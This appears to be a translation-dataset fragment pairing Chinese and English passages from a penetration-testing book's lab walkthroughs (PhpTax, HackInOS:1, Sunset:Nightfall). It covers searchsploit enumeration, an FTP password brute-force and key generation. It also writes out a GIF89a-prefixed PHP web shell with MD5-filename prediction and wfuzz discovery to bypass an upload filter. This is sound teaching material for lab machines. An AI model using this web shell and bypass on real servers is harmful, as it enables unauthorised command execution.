  trans: "\n\n## 图 7.20: 端口 8080 显示索引页而非禁止 403 错误页\n\n太好了，服务器返回了一个网页而不是通常的 403 或禁止消息，我们可以看到指向\
    \ phptax 应用的链接。\n\n![](img/Figure-7.21.jpg)\n\n### 图 7.21: 端口 8080 上的 PHPTax 应用\n\
    \n页面标题显示 phptax 应用由 William L. Bergrenn 开发，版权年份为 2003 年。页面或源代码中均未提到任何版本详情。\n\n\
    让我们使用 `searchsploit` 搜索 phptax 应用的任何已知漏洞。\n\n![](img/Figure-7.22.jpg)\n\n### 图\
    \ 7.22: PHPTax 漏洞利用列表\n\nsearchsploit 为 phptax 应用找到了三个搜索结果：\n\n- PhpTax - 'pfilez'\
    \ Execution Remote Cod | `exploits/php/webapps/21833.rb`\n- PhpTax 0.8 - File\
    \ Manipulation 'newval | `exploits/php/webapps/25849.txt`\n- phptax 0.8 - Remote\
    \ Code Execution | `exploits/php/webapps/21665.txt`\n\n记录目前为止观察结果，我们将在下一章继续研究该机器。\n\
    \n#### 观察笔记：\n\n- **IP 地址：** 10.0.2.104\n- **操作系统：** FreeBSD\n- **开放端口与服务：**\n\
    \    * 80/tcp http\n        * Apache httpd 2.2.21\n        * mod_ssl/2.2.21\n\
    \        * OpenSSL/0.9.8q\n        * DAV/2 PHP/5.3.8\n        * 发现 pChart 应用：`http://10.0.2.104/pChart2.1.3/index.php`\n\
    \            * 发现漏洞\n            ![](img/ent.jpg) pChart 2.1.3 - Multiple Vulnerabilitie\
    \ | `exploits/php/webapps/31173.txt`\n    * 8080/tcp http\n        * Apache httpd\
    \ 2.2.21\n            * 需要 User-agent：‘Mozilla/4.0 Mozilla4_browser’\n       \
    \ * mod_ssl/2.2.21\n        * OpenSSL/0.9.8q\n        * DAV/2 PHP/5.3.8\n    \
    \    * 发现 PhpTax 应用：`http://10.0.2.104:8080/phptax/`\n            * 发现漏洞\n   \
    \         ![](img/ent.jpg) PhpTax - 'pfilez' Execution Remote Cod | `exploits/php/webapps/21833.rb`\n\
    \            ![](img/ent.jpg) PhpTax 0.8 - File Manipulation 'newval | `exploits/php/webapps/25849.txt`\n\
    \            ![](img/ent.jpg) phptax 0.8 - Remote Code Execution | `exploits/php/webapps/21665.txt`\n\
    \n# #HackInOS:1\n\n在枚举阶段，我们在 Web 服务器上遇到了一个 PHP 上传页面。`upload.php` 页面的 HTML 源代码包含一个注释，为我们提供了一个指向开发者\
    \ GitHub 页面的链接。\n\n让我们使用 `firefox` 浏览器在 GitHub 上打开 `upload.php` 源代码页面。`https://github.com/fatihhcelik/Vulnerable-Machine---Hint/blob/master/upload.php`\n\
    \n阅读源码后，你将对上传文件的功能有相当深入的理解。让我们看看在文件中发现了什么：\n\n```php\n$target_dir = \"uploads/\"\
    ;\n```\n\n文件上传目录的位置是 `uploads`。\n\n```php\nif($check[\"mime\"] == \"image/png\"\
    \ || $check[\"mime\"] == \"image/gif\"){\n```\n\n服务器根据 mime 类型检查类型，允许的文件类型为 `png`\
    \ 和 `gif`。\n\n```php\n$rand_number = rand(1,100);\n```\n\n随机选取的数字来自 1 到 100 的小数字集合。\n\
    \n```php\n$target_file = $target_dir . md5(basename($_FILES[\"file\"][\"name\"\
    ].$rand_number));\n```\n\n文件上传到服务器后遵循的命名规范。\n\n利用现有的信息，让我们创建一个包含 GIF 标签的基础 php\
    \ php shell 文件，以绕过服务器端的上传过滤器，从而检查并最终演示漏洞。\n\n打开终端，使用命令 `nano cmd.php` 创建一个名为 `cmd.php`\
    \ 的文件，并在文件中添加以下内容：\n\n```php\nGIF89a;\n<? system($_GET['cmd']);?>\n```\n\n上述 `cmd.php`\
    \ 文件将赋予我们对远程服务器的基本访问，并允许我们通过网络浏览器在目标上执行简单的系统命令。\n\n使用 `Firefox` 浏览器访问 `http://10.0.2.4:8000/upload.php`\
    \ 并上传我们创建的 `cmd.php` 文件。\n\n![](img/Figure-7.23.jpg)\n\n### 图 7.23: 上传 cmd.php\n\
    \n一旦你将 `cmd.php` 文件上传到服务器，我们仍然无法访问该文件，因为文件名被上传脚本更改了。我们需要在上传后找到它的新名称。\n\n我们目前已知文件名将是原始文件名（`cmd.php`）的\
    \ MD5 哈希值后加上一个 1 到 100 之间的随机数，因此 `/uploads` 目录中的最终文件名将是 `cmd.php1`、`cmd.php2`\
    \ 直到 `cmd.php100` 任何一个值的 MD5 哈希值。\n\n我们将在终端中使用命令 `echo -n cmd.php(n) | md5sum`\
    \ 生成字符串 `cmd.php1`、`cmd.php2`、`cmd.php3` 等的 `md5sum`。\n\n![](img/Figure-7.24.jpg)\n\
    \n### 图 7.24: 创建 MD5 哈希字符串\n\n如你所见，我们已经为字符串 `cmd.php1` 生成了 32 字节的 MD5 哈希，并在最后添加了一些空格和\
    \ -。\n\n这种一个一个执行命令的方法将是非常枯燥且低效的过程，并耗费大量时间和精力，因此让我们自动化此过程并存储所有的哈希值。\n\n```bash\n\
    for ((i=1; i<=100; i++)); do echo -n cmd.php$i | md5sum; done | cut -d \" \" -f1\
    \ > md5strings.txt\n```\n\n上述 `for` 循环生成 md5sum 输出，通过管道由 `cut` 命令过滤并存储到 `md5strings.txt`。`cut`\
    \ 命令中的 `-d \" \"` 标志将分隔符设置为空格，`-f1` 标志提取第一个字段。\n\n![](img/Figure-7.25.jpg)\n\n\
    ### 图 7.25: 自动化 md5 哈希\n\n我们的 bash 脚本生成了 `cmd.php1` 到 `cmd.php100` 的所有可能文件的哈希值列表。\n\
    \n文件已经上传，我们只需要检查目标服务器上 `/uploads` 目录是否存在这些文件。由于我们需要处理大量的潜在文件名，我们将使用名为 *wfuzz*\
    \ 的工具自动化查找服务器上文件的过程。\n\n打开终端并运行命令：\n\n```bash\nwfuzz -w md5strings.txt --hc 404\
    \ http://10.0.2.4:8000/uploads/FUZZ.php\n```\n\n`wfuzz` 工具是一种基于网络的 Web 应用模糊工具，支持对\
    \ Web 应用进行破解，该工具通过将‘FUZZ’关键字替换为负载中的值来运行。`-w` 标志用于指定包含 FUZZ 单词的文件，而 `--hc` 标志隐藏指定状态码的响应。\n\
    \n"
- fmt: "\nOpen the terminal window and issue `searchsploit <software-name><version>`\
    \ command one by one on the list of packages given above.\n\n![](images/Figure-7.28.jpg)\n\
    \n**Figure 7.28:** List of Apache 2.4 exploits\n\nOur search for Apache 2.4 presents\
    \ us with a list of potential exploits, we can see two Apache exploits which match\
    \ with the Apache version installed on the target and may be useful to us:\n\n\
    `Apache 2.4.17 < 2.4.38 - 'apache2ctl g | exploits/linux/local/46676.php`\n\n\
    `Apache < 2.2.34 / < 2.4.27 - OPTIONS M | exploits/linux/webapps/42745.py`\n\n\
    ![](images/Figure-7.29.jpg)\n\n**Figure 7.29:** List of WordPress 5.0.3 exploits\n\
    \nSearching for WordPress on searchsploit gives one match for stored XSS and CSRF\
    \ combination vulnerability:\n\n`WordPress Plugin Quick Page/Post Redir | exploits/php/webapps/32867.txt`\n\
    \n![](images/Figure-7.30.jpg)\n\n**Figure 7.30:** List of OpenSSH 7.2p2 exploits\n\
    \nResults of OpenSSH search show two potential exploits for version 7.2p2.\n\n\
    `OpenSSH 7.2p2 - Username Enumeration  | exploits/linux/remote/40136.py`\n\n`OpenSSHd\
    \ 7.2p2 - Username Enumeration  | exploits/linux/remote/40113.txt`\n\nTake notes\
    \ on the observations made so far, and we will continue with this machine in the\
    \ next chapter.\n\n**Observation Notes:**\n\n**IP address:** 10.0.2.4\n\n**Operating\
    \ System:** Ubuntu Linux\n\n**Open Ports & Services:**\n\n*   22/tcp SSH\n   \
    \ *   OpenSSH 7.2p2 Ubuntu 4ubuntu2.7\n    *   Exploits Found\n        *   OpenSSH\
    \ 7.2p2 - Username Enumeration  | exploits/linux/remote/40136.py\n        *  \
    \ OpenSSHd 7.2p2 - Username Enumeration  | exploits/linux/remote/40113.txt\n*\
    \   8000/tcp HTTP\n    *   Apache httpd 2.4.25\n    *   Exploits found\n     \
    \   *   Apache 2.4.17 < 2.4.38 - 'apache2ctl g | exploits/linux/local/46676.php\n\
    \        *   Apache < 2.2.34 / < 2.4.27 - OPTIONS M | exploits/linux/webapps/42745.py\n\
    \    *   WordPress 5.0.3\n    *   Exploit found\n        *   WordPress Plugin\
    \ Quick Page/Post Redir | exploits/php/webapps/32867.txt\n    *   http-robots.txt:\
    \ 2 disallowed entries\n        *   /upload.php\n            ![](images/ent.jpg)\
    \ page source available on [https://github.com/fatihhcelik/Vulnerable-Machine---Hint/blob/master/upload.php](https://github.com/fatihhcelik/Vulnerable-Machine---Hint/blob/master/upload.php)\n\
    \            ![](images/ent1.jpg) GIF and PNG files are allowed, uploaded files\
    \ are renamed to md5-hash(filename + random number 1-100).ext and stored in /uploads\
    \ directory.\n            ![](images/ent1.jpg) Basic webshell cmd.php with GIF89a\
    \ tag was uploaded to the server.\n            ![](images/ent1.jpg) Webserver\
    \ is running with privileges of user www-data.\n*   /uploads\n\n# Sunset:Nightfall\n\
    \nThe service enumeration performed in the previous phase provided us with the\
    \ versions for the services running on the target machine, the list of services\
    \ and their corresponding version numbers are listed as follows:\n\npyftpdlib\
    \ version 1.5.5\n\nOpenSSH version 7.9p1\n\nApache2 package version 2.4.38\n\n\
    MySQL package version 5.5.5-10.3.15-MariaDB-1\n\nOpen the terminal window and\
    \ issue `searchsploit <software-name><version>` command one by one on the list\
    \ of packages given above.\n\n![](images/Figure-7.31.jpg)\n\n**Figure 7.31:**\
    \ list of Apache 2.4.38 exploits\n\nSearching for Apache 2.4.38 on searchsploit\
    \ resulted in one match:\n\n`Apache 2.4.17 < 2.4.38 - 'apache2ctl g | exploits/linux/local/46676.php`\n\
    \nSearch for pyftpdlib, OpenSSH and MySQL did not produce any meaningful exploit\
    \ or shellcode results for the versions installed on the target host.\n\nThe enumeration\
    \ of smb service revealed two users (matt and nightfall) on the target system,\
    \ we were later able to bruteforce the password for user matt as cheese using\
    \ the ftp protocol. The credentials were tried on the SSH service however login\
    \ was denied.\n\nLogging in to the FTP service with credentials of user `matt`\
    \ gave us access to the user’s home directory. We will attempt to leverage the\
    \ FTP access to gain shell access on the remote system.\n\nOpen up a terminal\
    \ and run the `ssh-keygen` command, and accept the default choices provided.\n\
    \n![](images/Figure-7.32.jpg)\n\n**Figure 7.32:** Generating rsa public/private\
    \ keys using ssh-keygen\n\nThe public key has been generated and stored in `/root/.ssh/id_rsa.pub`.\n\
    \nNext step is to copy the `id_rsa` key to the current working directory using\
